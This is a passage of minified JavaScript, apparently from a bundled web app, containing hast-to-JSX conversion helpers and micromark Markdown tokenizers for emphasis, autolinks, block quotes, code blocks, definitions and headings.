r.value==`object`)if(r.value.data&&r.value.data.estree&&e.evaluater){let t=r.value.data.estree.body[0];t.type,a=e.evaluater.evaluateExpression(t.expression)}else Rh(e,t.position);else a=r.value===null?!0:r.value;n[i]=a}return n}function Ph(e,t){let n=[],r=-1,i=e.passKeys?new Map:hh;for(;++r<t.children.length;){let a=t.children[r],o;if(e.passKeys){let e=a.type===`element`?a.tagName:a.type===`mdxJsxFlowElement`||a.type===`mdxJsxTextElement`?a.name:void 0;if(e){let t=i.get(e)||0;o=e+`-`+t,i.set(e,t+1)}}let s=xh(e,a,o);s!==void 0&&n.push(s)}return n}function Fh(e,t,n){let r=Jm(e.schema,t);if(!(n==null||typeof n==`number`&&Number.isNaN(n))){if(Array.isArray(n)&&(n=r.commaSeparated?fm(n):$m(n)),r.property===`style`){let t=typeof n==`object`?n:Ih(e,String(n));return e.stylePropertyNameCase===`css`&&(t=zh(t)),[`style`,t]}return[e.elementAttributeNameCase===`react`&&r.space?Wm[r.property]||r.property:r.attribute,n]}}function Ih(e,t){try{return(0,ph.default)(t,{reactCompat:!0})}catch(t){if(e.ignoreInvalidStyle)return{};let n=t,r=new fh("Cannot parse `style` attribute",{ancestors:e.ancestors,cause:n,ruleId:`style`,source:`hast-util-to-jsx-runtime`});throw r.file=e.filePath||void 0,r.url=yh+`#cannot-parse-style-attribute`,r}}function Lh(e,t,n){let r;if(!n)r={type:`Literal`,value:t};else if(t.includes(`.`)){let e=t.split(`.`),n=-1,i;for(;++n<e.length;){let t=gm(e[n])?{type:`Identifier`,name:e[n]}:{type:`Literal`,value:e[n]};i=i?{type:`MemberExpression`,object:i,property:t,computed:!!(n&&t.type===`Literal`),optional:!1}:t}r=i}else r=gm(t)&&!/^[a-z]/.test(t)?{type:`Identifier`,name:t}:{type:`Literal`,value:t};if(r.type===`Literal`){let t=r.value;return mh.call(e.components,t)?e.components[t]:t}if(e.evaluater)return e.evaluater.evaluateExpression(r);Rh(e)}function Rh(e,t){let n=new fh("Cannot handle MDX estrees without `createEvaluater`",{ancestors:e.ancestors,place:t,ruleId:`mdx-estree`,source:`hast-util-to-jsx-runtime`});throw n.file=e.filePath||void 0,n.url=yh+`#cannot-handle-mdx-estrees-without-createevaluater`,n}function zh(e){let t={},n;for(n in e)mh.call(e,n)&&(t[Bh(n)]=e[n]);return t}function Bh(e){let t=e.replace(gh,Vh);return t.slice(0,3)===`ms-`&&(t=`-`+t),t}function Vh(e){return`-`+e.toLowerCase()}var Hh={action:[`form`],cite:[`blockquote`,`del`,`ins`,`q`],data:[`object`],formAction:[`button`,`input`],href:[`a`,`area`,`base`,`link`],icon:[`menuitem`],itemId:null,manifest:[`html`],ping:[`a`,`area`],poster:[`video`],src:[`audio`,`embed`,`iframe`,`img`,`input`,`script`,`source`,`track`,`video`]},Uh={};function Wh(e,t){let n=t||Uh;return Gh(e,typeof n.includeImageAlt==`boolean`?n.includeImageAlt:!0,typeof n.includeHtml==`boolean`?n.includeHtml:!0)}function Gh(e,t,n){if(qh(e)){if(`value`in e)return e.type===`html`&&!n?``:e.value;if(t&&`alt`in e&&e.alt)return e.alt;if(`children`in e)return Kh(e.children,t,n)}return Array.isArray(e)?Kh(e,t,n):``}function Kh(e,t,n){let r=[],i=-1;for(;++i<e.length;)r[i]=Gh(e[i],t,n);return r.join(``)}function qh(e){return!!(e&&typeof e==`object`)}var Jh=document.createElement(`i`);function Yh(e){let t=`&`+e+`;`;Jh.innerHTML=t;let n=Jh.textContent;return n.charCodeAt(n.length-1)===59&&e!==`semi`||n===t?!1:n}function Xh(e,t,n,r){let i=e.length,a=0,o;if(t=t<0?-t>i?0:i+t:t>i?i:t,n=n>0?n:0,r.length<1e4)o=Array.from(r),o.unshift(t,n),e.splice(...o);else for(n&&e.splice(t,n);a<r.length;)o=r.slice(a,a+1e4),o.unshift(t,0),e.splice(...o),a+=1e4,t+=1e4}function Zh(e,t){return e.length>0?(Xh(e,e.length,0,t),e):t}var Qh={}.hasOwnProperty;function $h(e){let t={},n=-1;for(;++n<e.length;)eg(t,e[n]);return t}function eg(e,t){let n;for(n in t){let r=(Qh.call(e,n)?e[n]:void 0)||(e[n]={}),i=t[n],a;if(i)for(a in i){Qh.call(r,a)||(r[a]=[]);let e=i[a];tg(r[a],Array.isArray(e)?e:e?[e]:[])}}}function tg(e,t){let n=-1,r=[];for(;++n<t.length;)(t[n].add===`after`?e:r).push(t[n]);Xh(e,0,0,r)}function ng(e,t){let n=Number.parseInt(e,t);return n<9||n===11||n>13&&n<32||n>126&&n<160||n>55295&&n<57344||n>64975&&n<65008||(n&65535)==65535||(n&65535)==65534||n>1114111?`�`:String.fromCodePoint(n)}function rg(e){return e.replace(/[\t\n\r ]+/g,` `).replace(/^ | $/g,``).toLowerCase().toUpperCase()}var ig=mg(/[A-Za-z]/),ag=mg(/[\dA-Za-z]/),og=mg(/[#-'*+\--9=?A-Z^-~]/);function sg(e){return e!==null&&(e<32||e===127)}var cg=mg(/\d/),lg=mg(/[\dA-Fa-f]/),ug=mg(/[!-/:-@[-`{-~]/);function Z(e){return e!==null&&e<-2}function dg(e){return e!==null&&(e<0||e===32)}function Q(e){return e===-2||e===-1||e===32}var fg=mg(/\p{P}|\p{S}/u),pg=mg(/\s/);function mg(e){return t;function t(t){return t!==null&&t>-1&&e.test(String.fromCharCode(t))}}function hg(e){let t=[],n=-1,r=0,i=0;for(;++n<e.length;){let a=e.charCodeAt(n),o=``;if(a===37&&ag(e.charCodeAt(n+1))&&ag(e.charCodeAt(n+2)))i=2;else if(a<128)/[!#$&-;=?-Z_a-z~]/.test(String.fromCharCode(a))||(o=String.fromCharCode(a));else if(a>55295&&a<57344){let t=e.charCodeAt(n+1);a<56320&&t>56319&&t<57344?(o=String.fromCharCode(a,t),i=1):o=`�`}else o=String.fromCharCode(a);o&&=(t.push(e.slice(r,n),encodeURIComponent(o)),r=n+i+1,``),i&&=(n+=i,0)}return t.join(``)+e.slice(r)}function $(e,t,n,r){let i=r?r-1:1/0,a=0;return o;function o(r){return Q(r)?(e.enter(n),s(r)):t(r)}function s(r){return Q(r)&&a++<i?(e.consume(r),s):(e.exit(n),t(r))}}var gg={tokenize:_g};function _g(e){let t=e.attempt(this.parser.constructs.contentInitial,r,i),n;return t;function r(n){if(n===null){e.consume(n);return}return e.enter(`lineEnding`),e.consume(n),e.exit(`lineEnding`),$(e,t,`linePrefix`)}function i(t){return e.enter(`paragraph`),a(t)}function a(t){let r=e.enter(`chunkText`,{contentType:`text`,previous:n});return n&&(n.next=r),n=r,o(t)}function o(t){if(t===null){e.exit(`chunkText`),e.exit(`paragraph`),e.consume(t);return}return Z(t)?(e.consume(t),e.exit(`chunkText`),a):(e.consume(t),o)}}var vg={tokenize:bg},yg={tokenize:xg};function bg(e){let t=this,n=[],r=0,i,a,o;return s;function s(i){if(r<n.length){let a=n[r];return t.containerState=a[1],e.attempt(a[0].continuation,c,l)(i)}return l(i)}function c(e){if(r++,t.containerState._closeFlow){t.containerState._closeFlow=void 0,i&&v();let n=t.events.length,a=n,o;for(;a--;)if(t.events[a][0]===`exit`&&t.events[a][1].type===`chunkFlow`){o=t.events[a][1].end;break}_(r);let s=n;for(;s<t.events.length;)t.events[s][1].end={...o},s++;return Xh(t.events,a+1,0,t.events.slice(n)),t.events.length=s,l(e)}return s(e)}function l(a){if(r===n.length){if(!i)return f(a);if(i.currentConstruct&&i.currentConstruct.concrete)return m(a);t.interrupt=!!(i.currentConstruct&&!i._gfmTableDynamicInterruptHack)}return t.containerState={},e.check(yg,u,d)(a)}function u(e){return i&&v(),_(r),f(e)}function d(e){return t.parser.lazy[t.now().line]=r!==n.length,o=t.now().offset,m(e)}function f(n){return t.containerState={},e.attempt(yg,p,m)(n)}function p(e){return r++,n.push([t.currentConstruct,t.containerState]),f(e)}function m(n){if(n===null){i&&v(),_(0),e.consume(n);return}return i||=t.parser.flow(t.now()),e.enter(`chunkFlow`,{_tokenizer:i,contentType:`flow`,previous:a}),h(n)}function h(n){if(n===null){g(e.exit(`chunkFlow`),!0),_(0),e.consume(n);return}return Z(n)?(e.consume(n),g(e.exit(`chunkFlow`)),r=0,t.interrupt=void 0,s):(e.consume(n),h)}function g(e,n){let s=t.sliceStream(e);if(n&&s.push(null),e.previous=a,a&&(a.next=e),a=e,i.defineSkip(e.start),i.write(s),t.parser.lazy[e.start.line]){let e=i.events.length;for(;e--;)if(i.events[e][1].start.offset<o&&(!i.events[e][1].end||i.events[e][1].end.offset>o))return;let n=t.events.length,a=n,s,c;for(;a--;)if(t.events[a][0]===`exit`&&t.events[a][1].type===`chunkFlow`){if(s){c=t.events[a][1].end;break}s=!0}for(_(r),e=n;e<t.events.length;)t.events[e][1].end={...c},e++;Xh(t.events,a+1,0,t.events.slice(n)),t.events.length=e}}function _(r){let i=n.length;for(;i-- >r;){let r=n[i];t.containerState=r[1],r[0].exit.call(t,e)}n.length=r}function v(){i.write([null]),a=void 0,i=void 0,t.containerState._closeFlow=void 0}}function xg(e,t,n){return $(e,e.attempt(this.parser.constructs.document,t,n),`linePrefix`,this.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)}function Sg(e){if(e===null||dg(e)||pg(e))return 1;if(fg(e))return 2}function Cg(e,t,n){let r=[],i=-1;for(;++i<e.length;){let a=e[i].resolveAll;a&&!r.includes(a)&&(t=a(t,n),r.push(a))}return t}var wg={name:`attention`,resolveAll:Tg,tokenize:Eg};function Tg(e,t){let n=-1,r,i,a,o,s,c,l,u;for(;++n<e.length;)if(e[n][0]===`enter`&&e[n][1].type===`attentionSequence`&&e[n][1]._close){for(r=n;r--;)if(e[r][0]===`exit`&&e[r][1].type===`attentionSequence`&&e[r][1]._open&&t.sliceSerialize(e[r][1]).charCodeAt(0)===t.sliceSerialize(e[n][1]).charCodeAt(0)){if((e[r][1]._close||e[n][1]._open)&&(e[n][1].end.offset-e[n][1].start.offset)%3&&!((e[r][1].end.offset-e[r][1].start.offset+e[n][1].end.offset-e[n][1].start.offset)%3))continue;c=e[r][1].end.offset-e[r][1].start.offset>1&&e[n][1].end.offset-e[n][1].start.offset>1?2:1;let d={...e[r][1].end},f={...e[n][1].start};Dg(d,-c),Dg(f,c),o={type:c>1?`strongSequence`:`emphasisSequence`,start:d,end:{...e[r][1].end}},s={type:c>1?`strongSequence`:`emphasisSequence`,start:{...e[n][1].start},end:f},a={type:c>1?`strongText`:`emphasisText`,start:{...e[r][1].end},end:{...e[n][1].start}},i={type:c>1?`strong`:`emphasis`,start:{...o.start},end:{...s.end}},e[r][1].end={...o.start},e[n][1].start={...s.end},l=[],e[r][1].end.offset-e[r][1].start.offset&&(l=Zh(l,[[`enter`,e[r][1],t],[`exit`,e[r][1],t]])),l=Zh(l,[[`enter`,i,t],[`enter`,o,t],[`exit`,o,t],[`enter`,a,t]]),l=Zh(l,Cg(t.parser.constructs.insideSpan.null,e.slice(r+1,n),t)),l=Zh(l,[[`exit`,a,t],[`enter`,s,t],[`exit`,s,t],[`exit`,i,t]]),e[n][1].end.offset-e[n][1].start.offset?(u=2,l=Zh(l,[[`enter`,e[n][1],t],[`exit`,e[n][1],t]])):u=0,Xh(e,r-1,n-r+3,l),n=r+l.length-u-2;break}}for(n=-1;++n<e.length;)e[n][1].type===`attentionSequence`&&(e[n][1].type=`data`);return e}function Eg(e,t){let n=this.parser.constructs.attentionMarkers.null,r=this.previous,i=Sg(r),a;return o;function o(t){return a=t,e.enter(`attentionSequence`),s(t)}function s(o){if(o===a)return e.consume(o),s;let c=e.exit(`attentionSequence`),l=Sg(o),u=!l||l===2&&i||n.includes(o),d=!i||i===2&&l||n.includes(r);return c._open=!!(a===42?u:u&&(i||!d)),c._close=!!(a===42?d:d&&(l||!u)),t(o)}}function Dg(e,t){e.column+=t,e.offset+=t,e._bufferIndex+=t}var Og={name:`autolink`,tokenize:kg};function kg(e,t,n){let r=0;return i;function i(t){return e.enter(`autolink`),e.enter(`autolinkMarker`),e.consume(t),e.exit(`autolinkMarker`),e.enter(`autolinkProtocol`),a}function a(t){return ig(t)?(e.consume(t),o):t===64?n(t):l(t)}function o(e){return e===43||e===45||e===46||ag(e)?(r=1,s(e)):l(e)}function s(t){return t===58?(e.consume(t),r=0,c):(t===43||t===45||t===46||ag(t))&&r++<32?(e.consume(t),s):(r=0,l(t))}function c(r){return r===62?(e.exit(`autolinkProtocol`),e.enter(`autolinkMarker`),e.consume(r),e.exit(`autolinkMarker`),e.exit(`autolink`),t):r===null||r===32||r===60||sg(r)?n(r):(e.consume(r),c)}function l(t){return t===64?(e.consume(t),u):og(t)?(e.consume(t),l):n(t)}function u(e){return ag(e)?d(e):n(e)}function d(n){return n===46?(e.consume(n),r=0,u):n===62?(e.exit(`autolinkProtocol`).type=`autolinkEmail`,e.enter(`autolinkMarker`),e.consume(n),e.exit(`autolinkMarker`),e.exit(`autolink`),t):f(n)}function f(t){if((t===45||ag(t))&&r++<63){let n=t===45?f:d;return e.consume(t),n}return n(t)}}var Ag={partial:!0,tokenize:jg};function jg(e,t,n){return r;function r(t){return Q(t)?$(e,i,`linePrefix`)(t):i(t)}function i(e){return e===null||Z(e)?t(e):n(e)}}var Mg={continuation:{tokenize:Pg},exit:Fg,name:`blockQuote`,tokenize:Ng};function Ng(e,t,n){let r=this;return i;function i(t){if(t===62){let n=r.containerState;return n.open||=(e.enter(`blockQuote`,{_container:!0}),!0),e.enter(`blockQuotePrefix`),e.enter(`blockQuoteMarker`),e.consume(t),e.exit(`blockQuoteMarker`),a}return n(t)}function a(n){return Q(n)?(e.enter(`blockQuotePrefixWhitespace`),e.consume(n),e.exit(`blockQuotePrefixWhitespace`),e.exit(`blockQuotePrefix`),t):(e.exit(`blockQuotePrefix`),t(n))}}function Pg(e,t,n){let r=this;return i;function i(t){return Q(t)?$(e,a,`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(t):a(t)}function a(r){return e.attempt(Mg,t,n)(r)}}function Fg(e){e.exit(`blockQuote`)}var Ig={name:`characterEscape`,tokenize:Lg};function Lg(e,t,n){return r;function r(t){return e.enter(`characterEscape`),e.enter(`escapeMarker`),e.consume(t),e.exit(`escapeMarker`),i}function i(r){return ug(r)?(e.enter(`characterEscapeValue`),e.consume(r),e.exit(`characterEscapeValue`),e.exit(`characterEscape`),t):n(r)}}var Rg={name:`characterReference`,tokenize:zg};function zg(e,t,n){let r=this,i=0,a,o;return s;function s(t){return e.enter(`characterReference`),e.enter(`characterReferenceMarker`),e.consume(t),e.exit(`characterReferenceMarker`),c}function c(t){return t===35?(e.enter(`characterReferenceMarkerNumeric`),e.consume(t),e.exit(`characterReferenceMarkerNumeric`),l):(e.enter(`characterReferenceValue`),a=31,o=ag,u(t))}function l(t){return t===88||t===120?(e.enter(`characterReferenceMarkerHexadecimal`),e.consume(t),e.exit(`characterReferenceMarkerHexadecimal`),e.enter(`characterReferenceValue`),a=6,o=lg,u):(e.enter(`characterReferenceValue`),a=7,o=cg,u(t))}function u(s){if(s===59&&i){let i=e.exit(`characterReferenceValue`);return o===ag&&!Yh(r.sliceSerialize(i))?n(s):(e.enter(`characterReferenceMarker`),e.consume(s),e.exit(`characterReferenceMarker`),e.exit(`characterReference`),t)}return o(s)&&i++<a?(e.consume(s),u):n(s)}}var Bg={partial:!0,tokenize:Ug},Vg={concrete:!0,name:`codeFenced`,tokenize:Hg};function Hg(e,t,n){let r=this,i={partial:!0,tokenize:x},a=0,o=0,s;return c;function c(e){return l(e)}function l(t){let n=r.events[r.events.length-1];return a=n&&n[1].type===`linePrefix`?n[2].sliceSerialize(n[1],!0).length:0,s=t,e.enter(`codeFenced`),e.enter(`codeFencedFence`),e.enter(`codeFencedFenceSequence`),u(t)}function u(t){return t===s?(o++,e.consume(t),u):o<3?n(t):(e.exit(`codeFencedFenceSequence`),Q(t)?$(e,d,`whitespace`)(t):d(t))}function d(n){return n===null||Z(n)?(e.exit(`codeFencedFence`),r.interrupt?t(n):e.check(Bg,h,b)(n)):(e.enter(`codeFencedFenceInfo`),e.enter(`chunkString`,{contentType:`string`}),f(n))}function f(t){return t===null||Z(t)?(e.exit(`chunkString`),e.exit(`codeFencedFenceInfo`),d(t)):Q(t)?(e.exit(`chunkString`),e.exit(`codeFencedFenceInfo`),$(e,p,`whitespace`)(t)):t===96&&t===s?n(t):(e.consume(t),f)}function p(t){return t===null||Z(t)?d(t):(e.enter(`codeFencedFenceMeta`),e.enter(`chunkString`,{contentType:`string`}),m(t))}function m(t){return t===null||Z(t)?(e.exit(`chunkString`),e.exit(`codeFencedFenceMeta`),d(t)):t===96&&t===s?n(t):(e.consume(t),m)}function h(t){return e.attempt(i,b,g)(t)}function g(t){return e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),_}function _(t){return a>0&&Q(t)?$(e,v,`linePrefix`,a+1)(t):v(t)}function v(t){return t===null||Z(t)?e.check(Bg,h,b)(t):(e.enter(`codeFlowValue`),y(t))}function y(t){return t===null||Z(t)?(e.exit(`codeFlowValue`),v(t)):(e.consume(t),y)}function b(n){return e.exit(`codeFenced`),t(n)}function x(e,t,n){let i=0;return a;function a(t){return e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),c}function c(t){return e.enter(`codeFencedFence`),Q(t)?$(e,l,`linePrefix`,r.parser.constructs.disable.null.includes(`codeIndented`)?void 0:4)(t):l(t)}function l(t){return t===s?(e.enter(`codeFencedFenceSequence`),u(t)):n(t)}function u(t){return t===s?(i++,e.consume(t),u):i>=o?(e.exit(`codeFencedFenceSequence`),Q(t)?$(e,d,`whitespace`)(t):d(t)):n(t)}function d(r){return r===null||Z(r)?(e.exit(`codeFencedFence`),t(r)):n(r)}}}function Ug(e,t,n){let r=this;return i;function i(t){return t===null?n(t):(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),a)}function a(e){return r.parser.lazy[r.now().line]?n(e):t(e)}}var Wg={name:`codeIndented`,tokenize:Kg},Gg={partial:!0,tokenize:qg};function Kg(e,t,n){let r=this;return i;function i(t){return e.enter(`codeIndented`),$(e,a,`linePrefix`,5)(t)}function a(e){let t=r.events[r.events.length-1];return t&&t[1].type===`linePrefix`&&t[2].sliceSerialize(t[1],!0).length>=4?o(e):n(e)}function o(t){return t===null?c(t):Z(t)?e.attempt(Gg,o,c)(t):(e.enter(`codeFlowValue`),s(t))}function s(t){return t===null||Z(t)?(e.exit(`codeFlowValue`),o(t)):(e.consume(t),s)}function c(n){return e.exit(`codeIndented`),t(n)}}function qg(e,t,n){let r=this;return i;function i(t){return r.parser.lazy[r.now().line]?n(t):Z(t)?(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),i):$(e,a,`linePrefix`,5)(t)}function a(e){let a=r.events[r.events.length-1];return a&&a[1].type===`linePrefix`&&a[2].sliceSerialize(a[1],!0).length>=4?t(e):Z(e)?i(e):n(e)}}var Jg={name:`codeText`,previous:Xg,resolve:Yg,tokenize:Zg};function Yg(e){let t=e.length-4,n=3,r,i;if((e[n][1].type===`lineEnding`||e[n][1].type===`space`)&&(e[t][1].type===`lineEnding`||e[t][1].type===`space`)){for(r=n;++r<t;)if(e[r][1].type===`codeTextData`){e[n][1].type=`codeTextPadding`,e[t][1].type=`codeTextPadding`,n+=2,t-=2;break}}for(r=n-1,t++;++r<=t;)i===void 0?r!==t&&e[r][1].type!==`lineEnding`&&(i=r):(r===t||e[r][1].type===`lineEnding`)&&(e[i][1].type=`codeTextData`,r!==i+2&&(e[i][1].end=e[r-1][1].end,e.splice(i+2,r-i-2),t-=r-i-2,r=i+2),i=void 0);return e}function Xg(e){return e!==96||this.events[this.events.length-1][1].type===`characterEscape`}function Zg(e,t,n){let r=0,i,a;return o;function o(t){return e.enter(`codeText`),e.enter(`codeTextSequence`),s(t)}function s(t){return t===96?(e.consume(t),r++,s):(e.exit(`codeTextSequence`),c(t))}function c(t){return t===null?n(t):t===32?(e.enter(`space`),e.consume(t),e.exit(`space`),c):t===96?(a=e.enter(`codeTextSequence`),i=0,u(t)):Z(t)?(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),c):(e.enter(`codeTextData`),l(t))}function l(t){return t===null||t===32||t===96||Z(t)?(e.exit(`codeTextData`),c(t)):(e.consume(t),l)}function u(n){return n===96?(e.consume(n),i++,u):i===r?(e.exit(`codeTextSequence`),e.exit(`codeText`),t(n)):(a.type=`codeTextData`,l(n))}}var Qg=class{constructor(e){this.left=e?[...e]:[],this.right=[]}get(e){if(e<0||e>=this.left.length+this.right.length)throw RangeError("Cannot access index `"+e+"` in a splice buffer of size `"+(this.left.length+this.right.length)+"`");return e<this.left.length?this.left[e]:this.right[this.right.length-e+this.left.length-1]}get length(){return this.left.length+this.right.length}shift(){return this.setCursor(0),this.right.pop()}slice(e,t){let n=t??1/0;return n<this.left.length?this.left.slice(e,n):e>this.left.length?this.right.slice(this.right.length-n+this.left.length,this.right.length-e+this.left.length).reverse():this.left.slice(e).concat(this.right.slice(this.right.length-n+this.left.length).reverse())}splice(e,t,n){let r=t||0;this.setCursor(Math.trunc(e));let i=this.right.splice(this.right.length-r,1/0);return n&&$g(this.left,n),i.reverse()}pop(){return this.setCursor(1/0),this.left.pop()}push(e){this.setCursor(1/0),this.left.push(e)}pushMany(e){this.setCursor(1/0),$g(this.left,e)}unshift(e){this.setCursor(0),this.right.push(e)}unshiftMany(e){this.setCursor(0),$g(this.right,e.reverse())}setCursor(e){if(!(e===this.left.length||e>this.left.length&&this.right.length===0||e<0&&this.left.length===0))if(e<this.left.length){let t=this.left.splice(e,1/0);$g(this.right,t.reverse())}else{let t=this.right.splice(this.left.length+this.right.length-e,1/0);$g(this.left,t.reverse())}}};function $g(e,t){let n=0;if(t.length<1e4)e.push(...t);else for(;n<t.length;)e.push(...t.slice(n,n+1e4)),n+=1e4}function e_(e){let t={},n=-1,r,i,a,o,s,c,l,u=new Qg(e);for(;++n<u.length;){for(;n in t;)n=t[n];if(r=u.get(n),n&&r[1].type===`chunkFlow`&&u.get(n-1)[1].type===`listItemPrefix`&&(c=r[1]._tokenizer.events,a=0,a<c.length&&c[a][1].type===`lineEndingBlank`&&(a+=2),a<c.length&&c[a][1].type===`content`))for(;++a<c.length&&c[a][1].type!==`content`;)c[a][1].type===`chunkText`&&(c[a][1]._isInFirstContentOfListItem=!0,a++);if(r[0]===`enter`)r[1].contentType&&(Object.assign(t,t_(u,n)),n=t[n],l=!0);else if(r[1]._container){for(a=n,i=void 0;a--;)if(o=u.get(a),o[1].type===`lineEnding`||o[1].type===`lineEndingBlank`)o[0]===`enter`&&(i&&(u.get(i)[1].type=`lineEndingBlank`),o[1].type=`lineEnding`,i=a);else if(!(o[1].type===`linePrefix`||o[1].type===`listItemIndent`))break;i&&(r[1].end={...u.get(i)[1].start},s=u.slice(i,n),s.unshift(r),u.splice(i,n-i+1,s))}}return Xh(e,0,1/0,u.slice(0)),!l}function t_(e,t){let n=e.get(t)[1],r=e.get(t)[2],i=t-1,a=[],o=n._tokenizer;o||(o=r.parser[n.contentType](n.start),n._contentTypeTextTrailing&&(o._contentTypeTextTrailing=!0));let s=o.events,c=[],l={},u,d,f=-1,p=n,m=0,h=0,g=[h];for(;p;){for(;e.get(++i)[1]!==p;);a.push(i),p._tokenizer||(u=r.sliceStream(p),p.next||u.push(null),d&&o.defineSkip(p.start),p._isInFirstContentOfListItem&&(o._gfmTasklistFirstContentOfListItem=!0),o.write(u),p._isInFirstContentOfListItem&&(o._gfmTasklistFirstContentOfListItem=void 0)),d=p,p=p.next}for(p=n;++f<s.length;)s[f][0]===`exit`&&s[f-1][0]===`enter`&&s[f][1].type===s[f-1][1].type&&s[f][1].start.line!==s[f][1].end.line&&(h=f+1,g.push(h),p._tokenizer=void 0,p.previous=void 0,p=p.next);for(o.events=[],p?(p._tokenizer=void 0,p.previous=void 0):g.pop(),f=g.length;f--;){let t=s.slice(g[f],g[f+1]),n=a.pop();c.push([n,n+t.length-1]),e.splice(n,2,t)}for(c.reverse(),f=-1;++f<c.length;)l[m+c[f][0]]=m+c[f][1],m+=c[f][1]-c[f][0]-1;return l}var n_={resolve:i_,tokenize:a_},r_={partial:!0,tokenize:o_};function i_(e){return e_(e),e}function a_(e,t){let n;return r;function r(t){return e.enter(`content`),n=e.enter(`chunkContent`,{contentType:`content`}),i(t)}function i(t){return t===null?a(t):Z(t)?e.check(r_,o,a)(t):(e.consume(t),i)}function a(n){return e.exit(`chunkContent`),e.exit(`content`),t(n)}function o(t){return e.consume(t),e.exit(`chunkContent`),n.next=e.enter(`chunkContent`,{contentType:`content`,previous:n}),n=n.next,i}}function o_(e,t,n){let r=this;return i;function i(t){return e.exit(`chunkContent`),e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),$(e,a,`linePrefix`)}function a(i){if(i===null||Z(i))return n(i);let a=r.events[r.events.length-1];return!r.parser.constructs.disable.null.includes(`codeIndented`)&&a&&a[1].type===`linePrefix`&&a[2].sliceSerialize(a[1],!0).length>=4?t(i):e.interrupt(r.parser.constructs.flow,n,t)(i)}}function s_(e,t,n,r,i,a,o,s,c){let l=c||1/0,u=0;return d;function d(t){return t===60?(e.enter(r),e.enter(i),e.enter(a),e.consume(t),e.exit(a),f):t===null||t===32||t===41||sg(t)?n(t):(e.enter(r),e.enter(o),e.enter(s),e.enter(`chunkString`,{contentType:`string`}),h(t))}function f(n){return n===62?(e.enter(a),e.consume(n),e.exit(a),e.exit(i),e.exit(r),t):(e.enter(s),e.enter(`chunkString`,{contentType:`string`}),p(n))}function p(t){return t===62?(e.exit(`chunkString`),e.exit(s),f(t)):t===null||t===60||Z(t)?n(t):(e.consume(t),t===92?m:p)}function m(t){return t===60||t===62||t===92?(e.consume(t),p):p(t)}function h(i){return!u&&(i===null||i===41||dg(i))?(e.exit(`chunkString`),e.exit(s),e.exit(o),e.exit(r),t(i)):u<l&&i===40?(e.consume(i),u++,h):i===41?(e.consume(i),u--,h):i===null||i===32||i===40||sg(i)?n(i):(e.consume(i),i===92?g:h)}function g(t){return t===40||t===41||t===92?(e.consume(t),h):h(t)}}function c_(e,t,n,r,i,a){let o=this,s=0,c;return l;function l(t){return e.enter(r),e.enter(i),e.consume(t),e.exit(i),e.enter(a),u}function u(l){return s>999||l===null||l===91||l===93&&!c||l===94&&!s&&`_hiddenFootnoteSupport`in o.parser.constructs?n(l):l===93?(e.exit(a),e.enter(i),e.consume(l),e.exit(i),e.exit(r),t):Z(l)?(e.enter(`lineEnding`),e.consume(l),e.exit(`lineEnding`),u):(e.enter(`chunkString`,{contentType:`string`}),d(l))}function d(t){return t===null||t===91||t===93||Z(t)||s++>999?(e.exit(`chunkString`),u(t)):(e.consume(t),c||=!Q(t),t===92?f:d)}function f(t){return t===91||t===92||t===93?(e.consume(t),s++,d):d(t)}}function l_(e,t,n,r,i,a){let o;return s;function s(t){return t===34||t===39||t===40?(e.enter(r),e.enter(i),e.consume(t),e.exit(i),o=t===40?41:t,c):n(t)}function c(n){return n===o?(e.enter(i),e.consume(n),e.exit(i),e.exit(r),t):(e.enter(a),l(n))}function l(t){return t===o?(e.exit(a),c(o)):t===null?n(t):Z(t)?(e.enter(`lineEnding`),e.consume(t),e.exit(`lineEnding`),$(e,l,`linePrefix`)):(e.enter(`chunkString`,{contentType:`string`}),u(t))}function u(t){return t===o||t===null||Z(t)?(e.exit(`chunkString`),l(t)):(e.consume(t),t===92?d:u)}function d(t){return t===o||t===92?(e.consume(t),u):u(t)}}function u_(e,t){let n;return r;function r(i){return Z(i)?(e.enter(`lineEnding`),e.consume(i),e.exit(`lineEnding`),n=!0,r):Q(i)?$(e,r,n?`linePrefix`:`lineSuffix`)(i):t(i)}}var d_={name:`definition`,tokenize:p_},f_={partial:!0,tokenize:m_};function p_(e,t,n){let r=this,i;return a;function a(t){return e.enter(`definition`),o(t)}function o(t){return c_.call(r,e,s,n,`definitionLabel`,`definitionLabelMarker`,`definitionLabelString`)(t)}function s(t){return i=rg(r.sliceSerialize(r.events[r.events.length-1][1]).slice(1,-1)),t===58?(e.enter(`definitionMarker`),e.consume(t),e.exit(`definitionMarker`),c):n(t)}function c(t){return dg(t)?u_(e,l)(t):l(t)}function l(t){return s_(e,u,n,`definitionDestination`,`definitionDestinationLiteral`,`definitionDestinationLiteralMarker`,`definitionDestinationRaw`,`definitionDestinationString`)(t)}function u(t){return e.attempt(f_,d,d)(t)}function d(t){return Q(t)?$(e,f,`whitespace`)(t):f(t)}function f(a){return a===null||Z(a)?(e.exit(`definition`),r.parser.defined.push(i),t(a)):n(a)}}function m_(e,t,n){return r;function r(t){return dg(t)?u_(e,i)(t):n(t)}function i(t){return l_(e,a,n,`definitionTitle`,`definitionTitleMarker`,`definitionTitleString`)(t)}function a(t){return Q(t)?$(e,o,`whitespace`)(t):o(t)}function o(e){return e===null||Z(e)?t(e):n(e)}}var h_={name:`hardBreakEscape`,tokenize:g_};function g_(e,t,n){return r;function r(t){return e.enter(`hardBreakEscape`),e.consume(t),i}function i(r){return Z(r)?(e.exit(`hardBreakEscape`),t(r)):n(r)}}var __={name:`headingAtx`,resolve:v_,tokenize:y_};function v_(e,t){let n=e.length-2,r=3,i,a;return e[r][1].type===`whitespace`&&(r+=2),n-2>r&&e[n][1].type===`whitespace`&&(n-=2),e[n][1].type===`atxHeadingSequence`&&(r===n-1||n-4>r&&e[n-2][1].type===`whitespace`)&&(n-=r+1===n?2:4),n>r&&(i={type:`atxHeadingText`,start:e[r][1].start,end:e[n][1].end},a={type:`chunkText`,start:e[r][1].start,end:e[n][1].end,contentType:`text`},Xh(e,r,n-r+1,[[`enter`,i,t],[`enter`,a,t],[`exit`,a,t],[`exit`,i,t]])),e}function y_(e,t,n){let r=0;return i;function i(t){return e.enter(`atxHeading`),a(t)}function 